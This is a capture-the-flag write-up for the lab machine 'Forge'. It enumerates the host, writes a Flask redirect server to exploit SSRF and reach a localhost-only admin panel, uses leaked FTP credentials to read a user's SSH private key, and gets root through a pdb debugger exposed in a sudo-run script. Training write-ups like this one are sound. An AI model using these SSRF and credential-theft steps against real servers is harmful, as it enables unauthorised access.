# Forge

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.204.233
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 16:00 EDT
Nmap scan report for 10.129.204.233
Host is up (0.0087s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

We have to add `forge.htb` to our `/etc/hosts` file to enumerate the website. Also, FTP is not a false positive here.&#x20;

### Forge.htb Enum

The website is some kind of Gallery that lets us view and upload images.

<figure><img src="../../../.gitbook/assets/image (3012).png" alt=""><figcaption></figcaption></figure>

The uploads portion allow us to use URLs:

<figure><img src="../../../.gitbook/assets/image (1863).png" alt=""><figcaption></figcaption></figure>

If we were to start a `nc` listener port and redirect the request to our machine, we would see this:

```
$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.204.233] 56488
GET /test HTTP/1.1
Host: 10.10.14.13
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

This was using a Python based website, that is sending requests. The website had nothing else to offer, and I wasn't able to download or execute any webshells. So I did some `wfuzz` subdomain fuzzing and `gobuster` directory scans.

`wfuzz` picked up on an administrator site:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.forge.htb' --hw=26 -u http://forge.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forge.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000036:   200        1 L      4 W        27 Ch       "admin"
```

Trying to visit it doesn't work though.

```
$ curl http://admin.forge.htb/
Only localhost is allowed
```

### Redirect Bypass --> SSH Key

All my attempts to access the admin panel via modifying HTTP headers didn't work. So we have to try something else.&#x20;

Since this server was in Python, and the administrator panel can only be accessed by `localhost`, I thought of creating a 'redirector' that would accept requests on the website and redirect us to the admin panel. Here's a good script for that:

{% embed url="https://stackoverflow.com/questions/14343812/redirecting-to-url-in-flask" %}

```python
import os
from flask import Flask,redirect

app = Flask(__name__)

@app.route('/')
def hello():
    return redirect("http://www.example.com", code=302)

if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
```

When we start this, the website would generate a link to an 'image', which would always fail to display because it's not an image.&#x20;

<figure><img src="../../../.gitbook/assets/image (2703).png" alt=""><figcaption></figcaption></figure>

But, when we `curl` it, we can see it contains the page contents of the admin panel:

```markup
$ curl http://forge.htb/uploads/mIIQuMY5OzWN8Fa2f5uF
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Let's read the announcements on the site.&#x20;

```markup
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

This reveals some credentials for us to use for FTP, which is behind a firewall. Since the `/upload` endpoint supports FTP traffic, we can make our script redirect us there using the `u` parameter and  `ftp://`.

```python
import os
from flask import Flask,redirect

app = Flask(__name__)

@app.route('/ftp')
def ftp():
    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1')

@app.route('/announce')
def announce():
    return redirect('http://admin.forge.htb/announcements',code=302)

@app.route('/')
def hello():
    return redirect("http://admin.forge.htb", code=302)

if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
```

When redirected, we can see the contents of the FTP server:

```
$ curl http://forge.htb/uploads/7iZvhkJMSjbby5oatOfe
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 May 07 14:26 user.txt
```

This looks like the user's directory, so let's check whether there's a `.ssh` folder present.&#x20;

```
$ curl http://forge.htb/uploads/EvkwW5i3ganDEIzW2doi
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
```

We can grab the `id_rsa` flag through this and SSH in as `user`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.&#x20;

## Privilege Escalation

### Remote Manage --> Path Hijacking

When we check `sudo` privileges, we find that `user` is able to run a Python script as `root`.

```
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:                                                 
    env_reset, mail_badpass,                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
                                                                                             
User user may run the following commands on forge:                                           
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Here's the script:

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

This program opens a port and then runs commands as `root`. The vulnerable part is when it opens `pdb` upon receivinig an input that is not a number.&#x20;

<figure><img src="../../../.gitbook/assets/image (2754).png" alt=""><figcaption></figcaption></figure>

`pdb` is Python Debugger, and running it as `root` means we can gain an easy shell.

<figure><img src="../../../.gitbook/assets/image (2352).png" alt=""><figcaption></figcaption></figure>

Rooted!
